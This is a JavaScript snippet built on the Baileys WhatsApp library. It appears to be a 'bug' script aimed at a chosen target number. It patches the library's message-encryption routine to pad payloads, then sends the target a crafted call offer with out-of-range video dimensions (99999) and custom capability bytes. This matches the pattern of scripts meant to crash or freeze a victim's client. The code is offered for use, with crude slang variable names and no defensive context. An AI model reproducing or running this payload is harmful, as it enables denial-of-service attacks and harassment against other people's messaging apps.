const {
  encodeSignedDeviceIdentity,
  jidDecode,
  encodeWAMessage
} = require("@whiskeysockets/baileys");

const devices = (await sock.getUSyncDevices([target], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
await sock.assertSessions(devices);

const xnxx = () => {
  const map = {};
  return {
    mutex(key, fn) {
      map[key] ??= { task: Promise.resolve() };
      map[key].task = (async prev => { try { await prev; } catch {} return fn(); })(map[key].task);
      return map[key].task;
    }
  };
};

const memek = xnxx();
const bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
const porno = sock.createParticipantNodes.bind(sock);
const yntkts = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
  if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
  const patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
  const ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

  const { id: meId, lid: meLid } = sock.authState.creds.me;
  const omak = meLid ? jidDecode(meLid)?.user : null;
  let shouldIncludeDeviceIdentity = false;

  const nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
    const { user: targetUser } = jidDecode(jid);
    const { user: ownPnUser } = jidDecode(meId);
    const isOwnUser = targetUser === ownPnUser || targetUser === omak;
    const y = jid === meId || jid === meLid;
    if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

    const bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
    return memek.mutex(jid, async () => {
      const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
      if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
      return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
    });
  }));

  return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

const awik = crypto.randomBytes(32);
const awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

const offerContent = [
  { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
  { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
  { tag: "net", attrs: { medium: "3" } },
  { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
  { tag: "encopt", attrs: { keygen: "2" } },
  { tag: "destination", attrs: {}, content: destinations },
  ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
];

if (isVideo) offerContent.splice(2, 0, { tag: "video", attrs: { orientation: "0", screen_width: "99999", screen_height: "99999", device_orientation: "0", enc: "vp8", dec: "vp8" } });

const lemiting = {
  tag: "call",
  attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
  content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": sock.user.id }, content: offerContent }]
};

await sock.sendNode(lemiting);
